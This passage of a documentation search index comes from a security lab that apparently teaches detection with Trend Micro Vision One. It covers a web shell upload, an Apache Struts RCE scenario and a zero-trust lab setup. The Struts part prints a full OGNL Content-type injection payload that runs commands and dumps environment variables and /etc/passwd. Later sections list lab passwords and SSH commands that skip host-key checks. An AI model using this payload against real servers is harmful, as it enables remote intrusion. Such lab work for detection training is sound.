/______| | / / '_ \\| |  / /  \n | |____   \\  /  | |____    / /_| |_| || | / /       | |/ /| (_) | | / /   \n  \\_____|   \\/   |______|  |____|\\___/ |_|/_/        |_|____\\___/|_|/_/    \n\n\n\n[@intx0x80]\n\n\nUploading Webshell .....\n$ \n</code></pre> <p>Either in the shell or from within your browser http://playground-ecs-ec2-135067951.eu-central-1.elb.amazonaws.com/pwn.jsp test some commands like <code>whoami</code> or <code>dpkg -l</code>.</p> <p>Your browser should present you a blank page with a form containing single field and a <code>Run</code> button. Type any Linux command you want and submit the form. The results will populate the page.</p> <p>Vision One Observed Attack Techniques:</p> <p></p>"},{"location":"scenarios/xdr4c/eks-struts/","title":"Scenario: Detect Apache Struts RCE Vulnerability Exploitation","text":"<p>DRAFT</p>"},{"location":"scenarios/xdr4c/eks-struts/#prerequisites","title":"Prerequisites","text":"<ul> <li>Playground One EKS Cluster</li> <li>Vision One Container Security</li> <li>Playground One Scenarios<ul> <li>Running app: Java-Goof running on vulnerable Tomcat</li> </ul> </li> <li>Extracted contents of <code>exploit.zip</code></li> </ul> <p>Ensure to have an ECS Cluster up and running:</p> <pre><code>pgo --apply eks\npgo --apply scenarios\n</code></pre> <p>If you need to extract the exploits unzip with the password <code>virus</code>:</p> <pre><code>cd ${ONEPATH}\nunzip exploits.zip\n</code></pre>"},{"location":"scenarios/xdr4c/eks-struts/#disclaimer","title":"Disclaimer","text":"<p>Note: It is highly recommended to have the <code>awsone.access_ip</code> set to a single IP or at least a small CIDR before deploying the ECS cluster. This will prevent anonymous users playing with your environmnent. Remember: we're using vulnerable apps.</p>"},{"location":"scenarios/xdr4c/eks-struts/#exploiting","title":"Exploiting","text":"<p>First, retrieve the load balancer DNS name</p> <pre><code>pgo -o scenarios\n</code></pre> <p>Example output with ECS EC2:</p> <pre><code>loadbalancer_dns_health_check = \"k8s-goat-healthch-e9104c52db-803985454.eu-central-1.elb.amazonaws.com\"\nloadbalancer_dns_hunger_check = \"k8s-goat-hungerch-0816ee11b2-1006982801.eu-central-1.elb.amazonaws.com\"\nloadbalancer_dns_java_goof = \"k8s-victims-javagoof-2c75b42412-356920097.eu-central-1.elb.amazonaws.com\"\nloadbalancer_dns_system_monitor = \"k8s-goat-systemmo-09a16052b6-565756108.eu-central-1.elb.amazonaws.com\"\n</code></pre> <p>You want the variable <code>loadbalancer_dns_java_goof</code>.</p>"},{"location":"scenarios/xdr4c/eks-struts/#exploit","title":"Exploit","text":"<p>Run:</p> <pre><code>cd ${ONEPATH}/exploits/struts/\n./struts-exploit.sh k8s-victims-javagoof-2c75b42412-356920097.eu-central-1.elb.amazonaws.com\n</code></pre> <p>Expexted result:</p> <pre><code>*   Trying 3.120.84.56:80...\n* Connected to k8s-victims-javagoof-2c75b42412-356920097.eu-central-1.elb.amazonaws.com (3.120.84.56) port 80 (#0)\n&gt; GET /todolist/ HTTP/1.1\n&gt; Host: k8s-victims-javagoof-2c75b42412-356920097.eu-central-1.elb.amazonaws.com\n&gt; User-Agent: curl/7.81.0\n&gt; Accept: */*\n&gt; Content-type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='env').(#cmds={'/bin/bash','-c',#cmd}).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\n&gt; \n* Mark bundle as not supporting multiuse\n&lt; HTTP/1.1 200 OK\n&lt; Date: Mon, 11 Sep 2023 07:18:49 GMT\n&lt; Transfer-Encoding: chunked\n&lt; Connection: keep-alive\n&lt; Server: Apache-Coyote/1.1\n&lt; \nWEB_APP_SERVICE_SERVICE_PORT=80\nKUBERNETES_SERVICE_PORT_HTTPS=443\nTREND_AP_LOG_FILE=STDERR\nJAVA_GOOF_SERVICE_SERVICE_PORT=8080\nKUBERNETES_SERVICE_PORT=443\nWEB_APP_SERVICE_PORT_80_TCP_ADDR=172.20.245.34\nMAVEN_CONFIG=/root/.m2\nMAVEN_PROJECTBASEDIR=/usr/src/goof\nHOSTNAME=java-goof-6c95b8cd5f-qn49h\nMAVEN_CMD_LINE_ARGS=/root/.m2 tomcat7:run\nJAVA_GOOF_SERVICE_PORT_8080_TCP_PORT=8080\n...\n* Mark bundle as not supporting multiuse\n&lt; HTTP/1.1 200 OK\n&lt; Date: Mon, 11 Sep 2023 07:18:49 GMT\n&lt; Transfer-Encoding: chunked\n&lt; Connection: keep-alive\n&lt; Server: Apache-Coyote/1.1\n&lt; \nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\n* Connection #0 to host k8s-victims-javagoof-2c75b42412-356920097.eu-central-1.elb.amazonaws.com left intact\n</code></pre> <p>Vision One Observed Attack Techniques:</p> <p></p>"},{"location":"scenarios/zero-trust/zero-trust-lab/","title":"Scenario: Zero Trust Secure Access Environment Setup","text":"<p>This scenario prepares an environment to play with Vision One Zero Trust Secure Access in AWS. It includes the following assets:</p> <ul> <li>Microsoft Windows Domain including a Certification Authority</li> <li>A Windows Server standalone</li> <li>A Windows Member Server</li> <li>A Linux host running a dockerized web application</li> <li>Vision One Service Gateway including Active Directory integration</li> <li>Vision One Private Access Gateway</li> </ul>"},{"location":"scenarios/zero-trust/zero-trust-lab/#prerequisites","title":"Prerequisites","text":"<ul> <li>Playground One Network with PGO Active Directory</li> <li>Activated Marketplace AMI for Trend Service Gateway BYOL</li> </ul> <p>You need to have activated the Trend Service Gateway BYOL AMI in Marketplace once. To do this, on the AWS Console choose the service EC2 and navigate to <code>Images --&gt; AMI Catalog</code>. Select the tab <code>AWS Marketplace AMIs</code> and seach for <code>Trend Micro Service Gateway</code>.</p> <p></p> <p>There should only be one AMI shown for your current region. Click on <code>[Select]</code> and <code>[Subscribe on instance launch]</code>. </p> <p></p> <p>Now, check your Playground One configuration.</p> <p>Verify, that you have the following three services enabled in your configuration.</p> <pre><code>pgo --config\n</code></pre> <pre><code>...\nAD - create PGO Active Directory? [true]:\nAWS SG - create Service Gateway [true]:\nPAC - create Private Access Gateway? [true]:\n...\n</code></pre> <pre><code>pgo --apply network\n</code></pre> <p>The Service Gateway gets a dedicated AWS Security Group assigned which allows SSH from your configured access IP(s) only. All other ports are only accessible from within the public and private subnets.</p> <p>The above <code>pgo --apply</code> will create some output:</p> <pre><code>ad_admin_password = &lt;sensitive&gt;\nad_ca_ip = \"54.93.162.135\"  # Public IP of the Certification Authority\nad_dc_ip = \"3.71.102.69\"  # Public IP of the Domain Controller\nad_dc_pip = \"10.0.4.57\"  # Private IP of the Domain Controller\nad_domain_admin = \"Administrator\"\nad_domain_name = \"pgo-id.local\"\n...\nsg_ami = \"ami-076cc3a0b6e31d873\"  # AMI used for the Service Gateway\nsg_va_ip = \"18.194.239.58\"  # Public IP of the Service Gateway\nsg_va_ssh = \"ssh -i /home/markus/projects/opensource/playground/playground-one/pgo-key-pair-oaxuizlr.pem -o StrictHostKeyChecking=no admin@18.194.239.58\"  # SSH Connection to Service Gateway\n...\nad_admin_password = TrendMicro.1  # Administrator Password for Active Directory\n</code></pre> <p>Log in to Domain Controller</p> <p>After the network has been set up, the service gateway has been deployed, and Active Directory has stabilized after about 10 minutes, you must authenticate to the domain controller using RDP at least once. Don't ask why. </p> <p>Use the public IP of the domain controller <code>ad_dc_ip</code> and the username <code>Administrator@&lt;your environment name&gt;.local</code> and connect via RDP.</p>"},{"location":"scenarios/zero-trust/zero-trust-lab/#configure-the-service-gateway","title":"Configure the Service Gateway","text":""},{"location":"scenarios/zero-trust/zero-trust-lab/#get-the-vision-one-api-key-for-the-service-gateway","title":"Get the Vision One API Key for the Service Gateway","text":"<p>In Vision One head over to <code>Workflow and Automation -&gt; Service Gateway Management</code> and click on <code>[Download Virtual Appliance]</code>.</p> <p></p> <p>In this scenario, you do not need to download the virtual appliance as we will be using an AWS Marketplace AMI. Simply copy the registration token shown at the bottom right and save it in a safe place.</p> <p></p>"},{"location":"scenarios/zero-trust/zero-trust-lab/#activate-the-service-gateway","title":"Activate the Service Gateway","text":"<p>Back to your console/shell run the following command (adapt the parameters to your environment):</p> <pre><code>pgo --output network\n</code></pre> <pre><code>...\nsg_va_ssh = \"ssh -i /home/markus/projects/opensource/playground/playground-one/pgo-key-pair-oaxuizlr.pem -o StrictHostKeyChecking=no admin@18.194.239.58\"\n...\nmad_admin_password = XrJ*5VPDZGmhhL70\n</code></pre> <p>The interesting value here is <code>sg_va_ssh</code>. Run the given command to connect to the Service Gateway.</p> <pre><code>ssh -i /home/markus/projects/opensource/playground/playground-one/pgo-key-pair-oaxuizlr.pem -o StrictHostKeyChecking=no admin@18.194.239.58\n</code></pre> <p></p> <pre><code>enable\n\n# Optionally\nconfigure endpoint &lt;some name, e.g. pgozt&gt;\n\nregister &lt;your API Token from the first step&gt;\n</code></pre> <p>It can take some time for the Service Gateway to show up in the console.</p>"},{"location":"scenarios/zero-trust/zero-trust-lab/#install-on-premise-directory-connection","title":"Install On-premise directory connection","text":"<p>In Vision One head over to <code>Workflow and Automation -&gt; Service Gateway Management</code> again. There should now be a Service Gateway listed. Select it, click on <code>Manage Services</code> just in the center, and download the <code>On-premise directory connection</code> to the gateway.</p> <p></p> <p></p> <p>Since the Playground One is able to create two different Active Directories depending on what you have enabled in your configuration continue if the following chapters.</p>"},{"location":"scenarios/zero-trust/zero-trust-lab/#deploy-the-instances-and-the-private-access-gateway","title":"Deploy the Instances and the Private Access Gateway","text":"<p>Run</p> <pre><code>pgo --apply scenarios-zerotrust\n</code></pre> <p>The above will create the following instances:</p> <ul> <li>A ubuntu based Linux server running a docker based Jellyfish web application</li> <li>A standalone windows server 2022</li> <li>A domain joined windows server 2022</li> <li>A Private Access Gateway</li> </ul> <p>All relevant information is shown in the output:</p> <pre><code>ad_admin_password = &lt;sensitive&gt;\nad_ca_ip = \"54.93.162.135\"\nad_dc_ip = \"3.71.102.69\"\nad_dc_pip = \"10.0.4.57\"\nad_domain_admin = \"Administrator\"\nad_domain_name = \"pgo-id.local\"\nad_users_dn = \"CN=Users,DC=pgo-id,DC=local\"\nlinux_pip = [\n  [\n    \"10.0.4.19\",\n  ],\n]\nlinux_ssh = [\n  tolist([\n    \"ssh -i /home/markus/projects/opensource/playground/playground-one/pgo-id-key-pair-ee6i8qnb.pem -o StrictHostKeyChecking=no ubuntu@3.123.129.154\",\n  ]),\n]\npac_ami = \"ami-029c673cf28a3d376\"\npac_va_ip = \"18.185.79.240\"\npac_va_ssh = \"ssh -i /home/markus/projects/opensource/playground/playground-one/pgo-zt-key-pair-rmh0wu4t.pem -o StrictHostKeyChecking=no admin@18.185.79.240\"\nwin_dns_names = [\n  [\n    \"ec2-18-159-52-223.eu-central-1.compute.amazonaws.com\",\n    \"ec2-18-192-22-223.eu-central-1.compute.amazonaws.com\",\n  ],\n]\nwin_ips = [\n  [\n    \"18.159.52.223\",\n    \"18.192.22.223\",\n  ],\n]\nwin_local_admin_password = &lt;sensitive&gt;\nwin_local_admin_username = \"admin\"\nwin_pips = [\n  [\n    \"10.0.4.158\",\n    \"10.0.4.119\",\n  ],\n]\nad_admin_password = TrendMicro.1\nwin_local_admin_password = dfE[ENw+$v9XfCB+\n</code></pre> <p>Here you see two public, private and dns_names for the windows machines. The first refers to the standalone server, the second to the domain joined instance.</p>"},{"location":"scenarios/zero-trust/zero-trust-lab/#connect-the-pgo-active-directory","title":"Connect the PGO Active Directory","text":"<p>From within your console/shell run the following command (or find the output from the previous step):</p> <pre><code>pgo --output network\n</code></pre> <pre><code>...\nad_ca_ip = \"54.93.162.135\"\nad_dc_ip = \"3.71.102.69\"\nad_dc_pip = \"10.0.4.57\"\n...\nad_admin_password = TrendMicro.1\n</code></pre> <p>The interesting values are now <code>ad_dc_pip</code> and the <code>ad_admin_password</code>.</p> <p>Lastly, in the Connection Settings choose the following parameters:</p> <ul> <li>Server Type: Microsoft Active Directory</li> <li>Server address: One of the private IPs out of <code>ad_dc_pip</code></li> <li>Encryption: <code>SSL</code></li> <li>Port: <code>636</code></li> <li>Base Distinguished Name: <code>Specific</code>, value: <code>DC=&lt;your environment name&gt;, DC=local</code></li> <li>Permission scope: <code>Read &amp; write</code></li> <li>User Name: <code>Administrator@&lt;your environment name&gt;.local</code></li> <li>Password: <code>ad_admin_password</code></li> </ul> <p>Example with environment name <code>pgo-id</code>:</p> <p></p> <p>This should connect the Active Directory to Vision One via the Service Gateway.</p> <p>Connect does not work</p> <p>If connecting to the Active Directory via the Third-Party Integration does still not work reboot the Domain Controller once.</p>"},{"location":"scenarios/zero-trust/zero-trust-lab/#optionally-install-security-event-forwarding","title":"(Optionally) Install Security Event Forwarding","text":"<p>Using the PGO Active Directory allows you to utilize the Security Event Forwarding. For this functionality you need to download the current installation package on the Domain Controller and walk through the installation procedure. For this scenario the setup package is already available in the downloads folder of the Domain Member Server.</p> <p>To access the downloads folder from the Domain Controller open the explorer and point to <code>\\\\10.0.4.119\\C$\\Downloads</code>.</p> <p>Run <code>trend-micro-vision-one-ad-connector</code> and install. </p> <p></p> <p></p> <p></p> <p></p> <p>Follow the workflow and file in the IP and API Key of your Service Gateway.</p> <p></p> <p>Heading back to the Active Directory integration of Vision One the agent should be listed after a short period of time.</p> <p></p> <p>Your environment should now be ready to play with Zero Trust Secure Access.</p>"},{"location":"scenarios/zero-trust/zero-trust-lab/#configure-the-private-access-gateway","title":"Configure the Private Access Gateway","text":""},{"location":"scenarios/zero-trust/zero-trust-lab/#get-the-vision-one-api-key-for-the-private-access-gateway","title":"Get the Vision One API Key for the Private Access Gateway","text":"<p>In Vision One head over to <code>Zero Trust Secure Access -&gt; Secure Access Conifugraion -&gt; Private Access Configuration</code> and click on <code>[Add Private Access Connector Group]</code>.</p> <p></p> <p></p> <p>Click the <code>[+]</code> and copy the registration token shown at the bottom right and save it in a safe place.</p> <p></p>"},{"location":"scenarios/zero-trust/zero-trust-lab/#activate-the-private-access-gateway","title":"Activate the Private Access Gateway","text":"<p>Back to your console/shell run the following command (adapt the parameters to your environment):</p> <pre><code>pgo --output scenarios-zertrust\n</code></pre> <p>Now paste the registration token from above:</p> <pre><code> __                 __   __   __             __      __        ___ \n|__) |     /\\  \\ / / _` |__) /  \\ |  | |\\ | |  \\    /  \\ |\\ | |__  \n|    |___ /~~\\  |  \\__&gt; |  \\ \\__/ \\__/ | \\| |__/    \\__/ | \\| |___ \n\nUsing PDO User Access Key ID: ...D44H\nConfiguration scenarios-zerotrust in directory /home/markus/projects/opensource/playground/playground-one/awsone/7-scenarios-zerotrust\nvar.private_access_gateway_registration_token\n  Enter a value: eyJhbGciOiJIUzI1NiI...\n</code></pre> <p>It can take some time for the Private Access Gateway to show up in the console.</p>"},{"location":"scenarios/zero-trust/zero-trust-lab/#test-access-the-web-application","title":"Test Access the Web Application","text":"<p>A dockerized Jellyfin is deployed on the Linux server. At any time you can retrieve it's private IP address by running</p> <pre><code>pgo --output scenarios-zerotrust\n</code></pre> <pre><code>...\nlinux_pip = [\n  [\n    \"10.0.4.19\",\n  ],\n]\n...\n</code></pre> <p>On any of the windows machines open the URL <code>http://&lt;linux_ip&gt;:8096</code></p> <p></p> <p>Set a username and password and follow the initial configuration and optionally add a Media Library.</p> <p></p> <p>\ud83c\udf89 Success \ud83c\udf89</p>"}]}